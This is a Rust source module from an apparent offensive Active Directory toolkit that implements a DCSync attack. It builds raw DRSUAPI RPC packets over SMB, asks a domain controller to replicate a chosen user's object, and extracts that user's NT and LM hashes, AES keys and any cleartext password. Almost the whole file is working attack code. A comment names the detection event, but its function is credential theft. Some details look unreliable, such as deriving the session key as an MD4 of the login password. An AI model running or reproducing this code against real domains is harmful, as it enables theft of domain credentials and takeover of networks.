//! DCSync a single user's secrets via MS-DRSR (DRS replication).
//!
//! Replicates a specific user's password hashes from a DC using the
//! Directory Replication Service Remote Protocol.

use overthrone_core::error::{OverthroneError, Result};
use overthrone_core::proto::smb::SmbSession;
use overthrone_core::proto::drsr;
use colored::Colorize;
use tracing::{info, warn};

use crate::runner::{ForgeConfig, ForgeResult, PersistenceResult};

/// Extracted secrets from DCSync
#[derive(Debug, Clone, serde::Serialize)]
pub struct DcSyncSecrets {
    pub username: String,
    pub domain: String,
    pub user_rid: u32,
    pub nt_hash: Option<String>,
    pub lm_hash: Option<String>,
    pub aes256_key: Option<String>,
    pub aes128_key: Option<String>,
    pub cleartext_password: Option<String>,
}

/// Perform DCSync to extract a single user's credentials via MS-DRSR.
pub async fn dcsync_single_user(
    config: &ForgeConfig,
    target_user: &str,
) -> Result<ForgeResult> {
    info!("[dcsync] DCSync for user: {}\\{}", config.domain, target_user);

    let realm = config.domain.to_uppercase();
    let base_dn = realm.split('.').map(|p| format!("DC={p}")).collect::<Vec<_>>().join(",");
    let user_dn = format!("CN={},CN=Users,{}", target_user, base_dn);

    // Get credentials
    let (user, pass) = if let Some(ref pw) = config.password {
        (&config.username as &str, pw as &str)
    } else if let Some(ref hash) = config.nt_hash {
        (&config.username as &str, hash as &str)
    } else {
        return Err(OverthroneError::custom("No credentials provided for DCSync"));
    };

    // Connect SMB to DC for RPC transport
    info!("[dcsync] Connecting to DC via SMB...");
    let smb = SmbSession::connect(&config.dc_ip, &config.domain, user, pass).await
        .map_err(|e| OverthroneError::Smb(format!("SMB connect failed: {e}")))?;

    // Build DRSR RPC bind
    let drsr_uuid: [u8; 16] = [
        0x35, 0x42, 0x51, 0xe3, 0x06, 0x4b, 0xd1, 0x11, 
        0xab, 0x04, 0x00, 0xc0, 0x4f, 0xc2, 0xdc, 0xd2,
    ];

    let bind_pdu = build_drsr_bind(&drsr_uuid);
    let bind_resp = smb.pipe_transact("drsuapi", &bind_pdu).await
        .map_err(|e| OverthroneError::custom(format!("DRSR bind failed: {e}")))?;

    if bind_resp.len() < 4 || bind_resp[2] != 12 {
        return Err(OverthroneError::custom("DRSR bind rejected"));
    }
    info!("[dcsync] {}", "✓ DRSR RPC bind successful".green());

    // DRSBind to get context handle
    let client_uuid: [u8; 16] = rand::random();
    let drs_bind_req = build_drs_bind(&client_uuid);
    let drs_bind_resp = smb.pipe_transact("drsuapi", &drs_bind_req).await
        .map_err(|e| OverthroneError::custom(format!("DRSBind failed: {e}")))?;

    if drs_bind_resp.len() < 48 {
        return Err(OverthroneError::custom("DRSBind response too short"));
    }
    let drs_handle = &drs_bind_resp[24..44];

    // DRSGetNCChanges for single object replication
    let gnc_req = build_gnc_request(drs_handle, &user_dn);
    let gnc_resp = smb.pipe_transact("drsuapi", &gnc_req).await
        .map_err(|e| OverthroneError::custom(format!("DRSGetNCChanges failed: {e}")))?;

    info!("[dcsync] Received {} bytes from DRSGetNCChanges", gnc_resp.len());

    // Derive session key and parse response
    let session_key = derive_session_key(pass)?;
    let secrets = parse_dcsync_response(&gnc_resp, &session_key, &realm);

    let extracted_count = secrets.len();
    let success = extracted_count > 0;

    for s in &secrets {
        info!("  {} {} → NT: {}", "✓".green(), s.username.bold(), 
            s.nt_hash.as_deref().unwrap_or("N/A").red());
        if let Some(ref ct) = s.cleartext_password {
            info!("    {} Cleartext: {}", "→".cyan(), ct.red());
        }
    }

    let details = format!(
        "DCSync for {}\\{}\nTarget DN: {}\nDC: {}\nExtracted: {} credential(s)\n\nDetection: Event ID 4662 with Replicating Directory Changes",
        realm, target_user, user_dn, config.dc_ip, extracted_count
    );

    Ok(ForgeResult {
        action: format!("DCSync ({})", target_user),
        domain: config.domain.clone(),
        success,
        ticket_data: None,
        persistence_result: Some(PersistenceResult {
            mechanism: "DCSync (MS-DRSR Replication)".into(),
            target: format!("{}\\{}", realm, target_user),
            success,
            details,
            cleanup_command: Some("# DCSync is read-only — no cleanup needed\n# Monitor via Event ID 4662 for detection".into()),
        }),
        message: format!("DCSync: extracted {} credential(s) for {}\\{}", extracted_count, realm, target_user),
    })
}

/// Build DRSR RPC bind PDU
fn build_drsr_bind(uuid: &[u8; 16]) -> Vec<u8> {
    let mut pdu = vec![5, 0, 11, 3, 0x10, 0, 0, 0];
    let off = pdu.len();
    pdu.extend_from_slice(&[0, 0, 0, 0]);
    pdu.extend_from_slice(&1u32.to_le_bytes());
    pdu.extend_from_slice(&4096u16.to_le_bytes());
    pdu.extend_from_slice(&4096u16.to_le_bytes());
    pdu.extend_from_slice(&0u32.to_le_bytes());
    pdu.extend_from_slice(&[1, 0, 0, 0, 0, 1, 0]);
    pdu.extend_from_slice(uuid);
    pdu.extend_from_slice(&4u16.to_le_bytes());
    pdu.extend_from_slice(&0u16.to_le_bytes());
    pdu.extend_from_slice(&[0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11, 
        0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60]);
    pdu.extend_from_slice(&2u32.to_le_bytes());
    let len = pdu.len() as u16;
    pdu[off..off+2].copy_from_slice(&len.to_le_bytes());
    pdu
}

/// Build DRSBind request
fn build_drs_bind(client_uuid: &[u8; 16]) -> Vec<u8> {
    let mut stub = Vec::new();
    stub.extend_from_slice(client_uuid);
    let ext = vec![48, 0, 0, 0, 0x00, 0x00, 0x40, 0x04];
    stub.extend_from_slice(&(ext.len() as u32).to_le_bytes());
    stub.extend_from_slice(&ext);
    build_rpc_req(0, &stub)
}

/// Build DRSGetNCChanges request for single object
fn build_gnc_request(handle: &[u8], dn: &str) -> Vec<u8> {
    let mut stub = Vec::new();
    stub.extend_from_slice(handle);
    stub.extend_from_slice(&8u32.to_le_bytes());
    stub.extend_from_slice(&ndr_string(dn));
    stub.extend_from_slice(&[0u8; 12]);
    stub.extend_from_slice(&(1u32 | 0x20 | 0x80000).to_le_bytes());
    stub.extend_from_slice(&1u32.to_le_bytes());
    stub.extend_from_slice(&0u32.to_le_bytes());
    stub.extend_from_slice(&7u32.to_le_bytes()); // EXOP_REPL_OBJ
    build_rpc_req(3, &stub)
}

/// Build generic RPC request PDU
fn build_rpc_req(opnum: u16, stub: &[u8]) -> Vec<u8> {
    let mut pdu = vec![5, 0, 0, 3, 0x10, 0, 0, 0];
    let len = (24 + stub.len()) as u16;
    pdu.extend_from_slice(&len.to_le_bytes());
    pdu.extend_from_slice(&[0, 0]);
    pdu.extend_from_slice(&1u32.to_le_bytes());
    pdu.extend_from_slice(&(stub.len() as u32).to_le_bytes());
    pdu.extend_from_slice(&[0, 0]);
    pdu.extend_from_slice(&opnum.to_le_bytes());
    pdu.extend_from_slice(stub);
    pdu
}

/// Build NDR conformant string
fn ndr_string(s: &str) -> Vec<u8> {
    let utf16: Vec<u8> = s.encode_utf16().chain(std::iter::once(0u16)).flat_map(|c| c.to_le_bytes()).collect();
    let len = (s.len() + 1) as u32;
    let mut buf = vec![0, 0, 2, 0];
    buf.extend_from_slice(&len.to_le_bytes());
    buf.extend_from_slice(&[0; 4]);
    buf.extend_from_slice(&len.to_le_bytes());
    buf.extend_from_slice(&utf16);
    while buf.len() % 4 != 0 { buf.push(0); }
    buf
}

/// Derive session key for DRSR decryption
fn derive_session_key(password: &str) -> Result<Vec<u8>> {
    use md4::{Md4, Digest};
    let utf16: Vec<u8> = password.encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
    let mut hasher = Md4::new();
    hasher.update(&utf16);
    Ok(hasher.finalize().to_vec())
}

/// Parse DCSync response using DRSR parser
fn parse_dcsync_response(resp: &[u8], key: &[u8], domain: &str) -> Vec<DcSyncSecrets> {
    match drsr::parse_get_nc_changes_reply(resp, key) {
        Ok(result) => result.objects.iter().map(|obj| DcSyncSecrets {
            username: obj.sam_account_name.clone(),
            domain: domain.to_string(),
            user_rid: obj.rid.unwrap_or(0),
            nt_hash: obj.nt_hash.as_ref().map(|h| h.iter().map(|b| format!("{:02x}", b)).collect()),
            lm_hash: obj.lm_hash.as_ref().map(|h| h.iter().map(|b| format!("{:02x}", b)).collect()),
            aes256_key: obj.supplemental_credentials.as_ref().and_then(|s| 
                s.aes256_key.as_ref().map(|k| k.iter().map(|b| format!("{:02x}", b)).collect())),
            aes128_key: None,
            cleartext_password: obj.supplemental_credentials.as_ref().and_then(|s| s.cleartext.clone()),
        }).collect(),
        Err(_) => Vec::new(),
    }
}
